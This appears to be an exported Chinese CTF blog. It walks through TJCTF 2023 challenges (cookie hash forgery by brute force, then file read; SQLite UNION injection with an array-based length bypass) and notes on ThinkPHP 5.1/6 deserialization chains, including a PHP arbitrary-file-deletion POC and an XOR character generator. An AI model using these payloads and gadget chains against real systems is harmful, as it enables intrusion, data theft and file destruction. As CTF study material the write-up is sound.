<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="built_in">input</span>(<span class="string">&quot;Input key:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        result=i^j</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(result) <span class="keyword">is</span> key ):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;(&quot;&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;&quot;^&quot;&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;&quot;)==&#x27;</span>+<span class="built_in">chr</span>(result)+<span class="string">&#x27;   chr(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)^chr(&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;)==&#x27;</span>+<span class="built_in">chr</span>(result))</span><br></pre></td></tr></table></figure>

<p>例如</p>
<p><img src="/2023/03/29/nkctf%20web/image-20230410215740449.png" alt="image-20230410215740449"></p>
]]></content>
  </entry>
  <entry>
    <title>TJCTF 2023</title>
    <url>/2023/05/30/pay-to-win(TJCTF%202023)/</url>
    <content><![CDATA[<p>pay-to-win      ez-sql</p>
<span id="more"></span>

<meta name="referrer" content="no-referrer">

<h3 id="pay-to-win"><a href="#pay-to-win" class="headerlink" title="pay-to-win"></a>pay-to-win</h3><p>给了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//app.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="built_in">bytes</span>(data, <span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.cookies.get(<span class="string">&#x27;data&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> request.cookies.get(<span class="string">&#x27;hash&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = request.cookies.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    decoded = b64decode(data)</span><br><span class="line">    data_hash = request.cookies.get(<span class="string">&#x27;hash&#x27;</span>)</span><br><span class="line">    payload = json.loads(decoded)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        resp = make_response(redirect(<span class="string">&#x27;/login&#x27;</span>))</span><br><span class="line">        resp.set_cookie(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">        resp.set_cookie(<span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    actual_hash = <span class="built_in">hash</span>(data + users[payload[<span class="string">&#x27;username&#x27;</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data_hash != actual_hash:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&#x27;user_type&#x27;</span>] == <span class="string">&#x27;premium&#x27;</span>:</span><br><span class="line">        theme_name = request.args.get(<span class="string">&#x27;theme&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;static/premium.css&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;premium.jinja&#x27;</span>, theme_to_use=<span class="built_in">open</span>(theme_name).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;basic.jinja&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_login</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.jinja&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_login</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        users[username] = <span class="built_in">hex</span>(random.getrandbits(<span class="number">24</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    resp = make_response(redirect(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;user_type&quot;</span>: <span class="string">&quot;basic&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    b64data = b64encode(json.dumps(data).encode())</span><br><span class="line">    data_hash = <span class="built_in">hash</span>(b64data.decode() + users[username])</span><br><span class="line">    resp.set_cookie(<span class="string">&#x27;data&#x27;</span>, b64data)</span><br><span class="line">    resp.set_cookie(<span class="string">&#x27;hash&#x27;</span>, data_hash)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>还有一个docker文件</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530104900654.png" alt="image-20230530104900654"></p>
<p>可以知道flag存在于&#x2F;secret-flag-dir&#x2F;flag.txt中</p>
<p>接下来分析一下源码</p>
<p>有两个路由，先看根路由</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530105024536.png" alt="image-20230530105024536"></p>
<p>看到这个路由最下面可以打开文件并读取，所以这里就是一个利用点，接着看怎样可以到达这个，需要让<code>payload[&#39;user_type&#39;] == &#39;premium&#39;:</code>，但是上面还有一个if，需要<code>data_hash == actual_hash</code>，actual_hash是经过<code>hash(data + users[payload[&#39;username&#39;]])</code>产生的，<code>users[payload[&#39;username&#39;]]</code>是用户首次登录在&#x2F;login路由下产生的唯一标识，data_hash是<code>cookie</code>中的<code>hash</code></p>
<p>再看&#x2F;login路由</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530105451727.png" alt="image-20230530105451727"></p>
<p>登录的时候先会检查是不是首次登录，如果是就会使用<code>users[username] = hex(random.getrandbits(24))[2:]</code>返回一个相当于用户标识的东西，这个标识在再次登录时是不会改变的，然后就是<code>data_hash = hash(b64data.decode() + users[username])</code>，经过自定义函数hash处理后传到cookie的hash中</p>
<p>为了满足<code>data_hash == actual_hash</code>，需要先获得首次登录产生的用户唯一标识<code>users[username] = hex(random.getrandbits(24))[2:]</code></p>
<p>先登录admin</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110126686.png" alt="image-20230530110126686"></p>
<p>在cookie处产生了</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110150875.png" alt="image-20230530110150875"></p>
<p>将data解码后是</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110215086.png" alt="image-20230530110215086"></p>
<p>先将user_type修改成premium，然后编码，替换掉data然后就是构造hash</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="built_in">bytes</span>(data, <span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">b64data = <span class="string">&#x27;eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJ1c2VyX3R5cGUiOiAiYmFzaWMifQ==&#x27;</span></span><br><span class="line">data_hash = <span class="string">&#x27;1af835e5354b1eabb67dfe7df8818f7377f4c83066de39ad3187fd8035f84cb7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>**<span class="number">3</span>):     //遍历寻找用户标识</span><br><span class="line">    users_hoge = <span class="built_in">hex</span>(r)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    h = <span class="built_in">hash</span>(b64data + users_hoge)</span><br><span class="line">    <span class="keyword">if</span> h == data_hash:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">b64data=<span class="string">&quot;eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJ1c2VyX3R5cGUiOiAicHJlbWl1bSJ9&quot;</span>  //&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;user_type&quot;</span>: <span class="string">&quot;premium&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">data_hash = <span class="built_in">hash</span>(b64data + users_hoge)</span><br><span class="line"><span class="built_in">print</span>(data_hash)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">e06f4cccf758cff90978f82555e0424877e9ecf7d2adc79cfd75fdb8d9b02968</span><br></pre></td></tr></table></figure>

<p>替换hash后刷新</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110725892.png" alt="image-20230530110725892"></p>
<p>最后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://pay-to-win.tjc.tf/?theme=/secret-flag-dir/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110800110.png" alt="image-20230530110800110"></p>
<h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez-sql"></a>ez-sql</h3><p>源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> sqlite3 = <span class="built_in">require</span>(<span class="string">&#x27;sqlite3&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> uuid = <span class="built_in">require</span>(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; parse &#125; = <span class="built_in">require</span>(<span class="string">&#x27;csv-parse&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./flag.txt&#x27;</span>, &#123; <span class="attr">encoding</span>: <span class="string">&#x27;utf8&#x27;</span> &#125;).<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> sqlite3.<span class="title class_">Database</span>(<span class="string">&#x27;:memory:&#x27;</span>);</span><br><span class="line"></span><br><span class="line">db.<span class="title function_">serialize</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    db.<span class="title function_">run</span>(<span class="string">&#x27;CREATE TABLE jokes (id INTEGER PRIMARY KEY, joke TEXT)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> stmt = db.<span class="title function_">prepare</span>(<span class="string">&#x27;INSERT INTO jokes (id, joke) VALUES (?, ?)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// jokes from https://github.com/amoudgl/short-jokes-dataset/blob/master/data/reddit-cleanjokes.csv</span></span><br><span class="line">    fs.<span class="title function_">createReadStream</span>(<span class="string">&#x27;./reddit-cleanjokes.csv&#x27;</span>).<span class="title function_">pipe</span>(<span class="title function_">parse</span>(&#123; <span class="attr">delimiter</span>: <span class="string">&#x27;,&#x27;</span> &#125;)).<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">row</span>) =&gt;</span> &#123;</span><br><span class="line">        stmt.<span class="title function_">run</span>(row[<span class="number">0</span>], row[<span class="number">1</span>]);</span><br><span class="line">    &#125;).<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        stmt.<span class="title function_">finalize</span>();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> flagTable = <span class="string">`flag_<span class="subst">$&#123;uuid.v4().replace(/-/g, <span class="string">&#x27;_&#x27;</span>)&#125;</span>`</span>;</span><br><span class="line">    db.<span class="title function_">run</span>(<span class="string">`CREATE TABLE IF NOT EXISTS <span class="subst">$&#123;flagTable&#125;</span> (flag TEXT)`</span>);</span><br><span class="line"></span><br><span class="line">    db.<span class="title function_">run</span>(<span class="string">`INSERT INTO <span class="subst">$&#123;flagTable&#125;</span> (flag) VALUES (&#x27;<span class="subst">$&#123;flag&#125;</span>&#x27;)`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; name &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!name) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">err</span>: <span class="string">&#x27;Bad request&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name.<span class="property">length</span> &gt; <span class="number">6</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">err</span>: <span class="string">&#x27;Bad request&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    db.<span class="title function_">all</span>(<span class="string">`SELECT * FROM jokes WHERE joke LIKE &#x27;%<span class="subst">$&#123;name&#125;</span>%&#x27;`</span>, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">message</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal server error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(rows);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server is running on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>![image-20230530171123411](pay-to-win(TJCTF 2023)&#x2F;image-20230530171123411.png)</p>
<p>这里的大概意思是创建一个sqlite3数据库对象，又在其中创建了jokes表，其中有id和joke两个列，通过<code>fs.createReadStream</code>将文段存入表中</p>
<p>然后又创建了存有flag的表，但是表名是通过uuid.v4()函数产生的，目前未知名称，在这个表中有一个名为flag的列</p>
<p>接下来看路由</p>
<p>![image-20230530171452318](pay-to-win(TJCTF 2023)&#x2F;image-20230530171452318.png)</p>
<p>这个路由可以读取表中的数据，但是对可控的name进行了长度限制，这个可以通过数组来绕过，然后使用union联合查询得到表名称即可获得flag</p>
<p>但是表名是一个未知的</p>
<p>查询资料看到</p>
<p>![image-20230530171834905](pay-to-win(TJCTF 2023)&#x2F;image-20230530171834905.png)</p>
<p>存有flag正是一个自建表</p>
<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ez-sql-4db84472ca9db26a.tjc.tf/search?name[]=11&#x27; union select 1,name from sqlite_master where type=&#x27;table&#x27; order by name--</span><br></pre></td></tr></table></figure>

<p>![image-20230530172107305](pay-to-win(TJCTF 2023)&#x2F;image-20230530172107305.png)</p>
<p>回显了表名</p>
<p>接下来直接读取表中的flag即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ez-sql-4db84472ca9db26a.tjc.tf/search?name[]=11&#x27; union select 1,flag from flag_b1af377e_0ac5_46cd_8889_fea243615ec9--</span><br></pre></td></tr></table></figure>

<p>![image-20230530172147626](pay-to-win(TJCTF 2023)&#x2F;image-20230530172147626.png)</p>
]]></content>
  </entry>
  <entry>
    <title>buuctf的部分解题</title>
    <url>/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>tp反序列化漏洞</p>
<span id="more"></span>

<h3 id="tp6"><a href="#tp6" class="headerlink" title="tp6"></a>tp6</h3><p>链子：__destruct()——&gt;save()——&gt;updateData()——&gt;checkAllowFields()——&gt;db()——&gt;$this-&gt;table . $this-&gt;suffix（字符串拼接）——&gt;toString()</p>
<p>$this-&gt;exists &#x3D; true;<br>$this-&gt;$lazySave &#x3D; true;<br>$this-&gt;$withEvent &#x3D; false;</p>
<p>__destruct()到save()</p>
<p>让lazySave为真</p>
<p>save()到updateData()</p>
<p>需要先进入到isEmpty()让data不为空，再进入trigger()让withEvent为false</p>
<p>updateData()到getChangedData()</p>
<p>让force为true</p>
<p>$data 为非空</p>
<p>getChangedData()继续到checkAllowFields()</p>
<p>$field和$schema 为空</p>
<p>db()到__toString()</p>
<p>__toString()到toJson()到toArray()</p>
<p>toArray()到getAttr()</p>
<p>$key的值传到getData()</p>
<p>getAttr()到getData()</p>
<p>传入的值不为空</p>
<p>getData()到getRealFieldName()</p>
<p>当$this-&gt;strict为true时直接返回$name，即$key</p>
<p>回到getData()，此时$fieldName &#x3D; $key</p>
<p>返回$this-&gt;data[$fielName]也就是$this-&gt;data[$key]，记为$value</p>
<p>从getData()再回到getAttr()再到getValue()</p>
<h3 id="tp6-0"><a href="#tp6-0" class="headerlink" title="tp6.0"></a>tp6.0</h3><p>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php，看save()函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153429066.png" alt="image-20230303153429066"></p>
<p>跟进write()函数</p>
<p>在vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php中</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153728183.png" alt="image-20230303153728183"></p>
<p>调用了<strong>writeFile</strong>函数，继续跟进</p>
<p>在<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong>中</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153827729.png" alt="image-20230303153827729"></p>
<p>看到<strong>file_put_contents</strong>函数，能写入文件</p>
<p>由此倒推</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents($path,$content,LOCK_EX)中的参数$path,$content来源于writeFile($path,$data)</span><br><span class="line"></span><br><span class="line">writeFile($path,$data)中的参数$path,$data来源于write(String $sessID,String $sessData)</span><br><span class="line"></span><br><span class="line">write(String $sessID,String $sessData)中的参数$sessID,$sessData来源于save()中调用了write()</span><br></pre></td></tr></table></figure>

<p>在save函数中有**getId()**函数，跟进，还有一个setId函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303154636521.png" alt="image-20230303154636521"></p>
<p>结合发现，当传入的id值长度为32时，创建sessionId，然后进行gitId()</p>
<p>寻找调用<strong>setID</strong>的地方，在<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php</strong></p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303191949198.png" alt="image-20230303191949198"></p>
<p>这还需要利用到getName函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/232af69eba7c4ac497f476c9bbd72041.png" alt="img"></p>
<p>发现控制的是session中的名为PHPSESSID的值，可以利用这个来上传文件</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>[GYCTF2020]EasyThinking</p>
<h3 id="tp5-1-35"><a href="#tp5-1-35" class="headerlink" title="tp5.1.35"></a>tp5.1.35</h3><p>创建漏洞点</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305165911024.png" alt="image-20230305165911024"></p>
<p>起点为<code>/thinkphp/library/think/process/pipes/Windows.php</code>的<code>__destruct()</code></p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302145613227.png" alt="image-20230302145613227"></p>
<p>这里调用了两个函数，先看removeFiles()函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302145652860.png" alt="image-20230302145652860"></p>
<p>$files是可控的，可以删除任意路径的文件</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="string">&#x27;需要删除文件的路径&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>

<p>在removeFiles()函数中，file_exist函数会将$filename当作字符串返回</p>
<p><code>__toString</code> 当一个对象被反序列化后又被当做字符串使用时会被触发</p>
<p>跟进<code>\thinkphp\library\think\model\concern\Conversion.php</code>，找到<code>__toString</code> 方法</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154027060.png" alt="image-20230302154027060"></p>
<p><code>__toString</code> 方法中还有一个toJson方法，查看toJson方法</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154131074.png" alt="image-20230302154131074"></p>
<p>继续查看toArray方法，其中重要的部分是</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154530056.png" alt="image-20230302154530056"></p>
<p>这里调用了一个<code>getRelation</code>方法，找到<code>\thinkphp\library\think\model\concern\Attribute.php</code>，继续查看<code>getRelation</code>方法</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302160945021.png" alt="image-20230302160945021"></p>
<p>看toArray方法的重要部分，<code>getRelation</code>方法下有一个<code>if (!$relation)</code>，所以不用管<code>getRelation</code>方法，直接返回空就可以，然后调用了<code>getAttr</code>方法</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302162010393.png" alt="image-20230302162010393"></p>
<p>里面有一个getData方法</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302162123772.png" alt="image-20230302162123772"></p>
<p>通过<code>getData</code>函数可以知道<code>$relation</code>的值为<code>$this-&gt;data[$name]</code>，而且这里的类定义使用的是Trait而不是class，因为用到了三个类，需要找一个类其中继承了<code>Attribute</code>类和<code>Conversion</code>类</p>
<p>在<code>\thinkphp\library\think\Model.php</code>中找到这样一个类</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302164807099.png" alt="image-20230302164807099"></p>
<p>在缺少一个进行代码执行的点，寻找<code>__call方法</code>，<code>__call</code>一般会存在<code>__call_user_func</code>和<code>__call_user_func_array</code>，php代码执行的终点经常选择这里</p>
<p>在<code>/thinkphp/library/think/Request.php</code>，找到一个<code>__call</code>函数，<code>__call</code> 调用不可访问或不存在的方法时被调用</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302170634963.png" alt="image-20230302170634963"></p>
<p>但是因为某些原因，这个方法并不能使用</p>
<p>但是在Thinkphp的Request类中还有一个功能filter功能，可以尝试覆盖<code>filter</code>的方法去执行代码</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302173603880.png" alt="image-20230302173603880"></p>
<p>但是这里的$value不可控，需要找到可以控制$value的点，找到input函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205209904.png" alt="image-20230302205209904"></p>
<p>但是input函数中的参数不可控，还得继续找到可控点，所以找到了param函数，重要部分</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302175226720.png" alt="image-20230302175226720"></p>
<p>但是还是不可控，继续找可以调用param函数的地方，找到了isAjax函数</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302174824834.png" alt="image-20230302174824834"></p>
<p>在<code>isAjax</code>函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，也就意味着param函数中的$name可控，param函数中的$name可控也就意味着input函数中的$name可控</p>
<p>input函数中有</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205324936.png" alt="image-20230302205324936"></p>
<p>可以控制的是name参数，查看getData函数</p>
